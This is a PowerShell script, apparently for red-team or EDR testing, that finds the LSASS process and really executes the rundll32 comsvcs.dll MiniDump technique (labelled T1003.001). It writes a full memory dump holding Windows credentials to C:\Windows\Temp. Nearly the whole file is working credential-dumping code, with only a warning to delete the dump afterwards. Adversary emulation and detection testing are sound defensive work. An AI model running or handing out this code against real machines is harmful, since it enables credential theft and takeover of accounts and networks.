$ErrorActionPreference = "Continue"
Write-Host "[*] Attempting Credential Dump (LSASS)..."

# Check Admin Privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    Write-Host "    [!] WARNING: Script running without Administrator privileges."
    Write-Host "    [!] LSASS dumping usually requires High Integrity/SYSTEM."
}

Write-Host "[*] Finding LSASS PID..."
$lsass = Get-Process lsass -ErrorAction SilentlyContinue

if (-not $lsass) {
    Write-Host "    [-] Could not find lsass process (Permission Denied?)."
    exit
}

Write-Host "    [+] Found LSASS (PID: $($lsass.Id))"

$dumpPath = "C:\Windows\Temp\lsass_$($lsass.Id).dmp"
Write-Host "[*] Executing MiniDump via comsvcs.dll (T1003.001)..."
Write-Host "    [>] cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full"

try {
    # REAL EXECUTION
    $proc = Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full" -PassThru -Wait
    
    Start-Sleep -Seconds 2
    
    if (Test-Path $dumpPath) {
        Write-Host "    [+] Dump Successful: $dumpPath"
        Write-Host "    [!] ALERT: This file contains sensitive credentials. Delete immediately after testing."
    } else {
        Write-Host "    [-] Dump file not found. Antivirus/EDR may have blocked execution."
    }
} catch {
    Write-Host "    [-] Execution Failed: $_"
}

Write-Host "`n[+] Credential Access Attempt Complete."
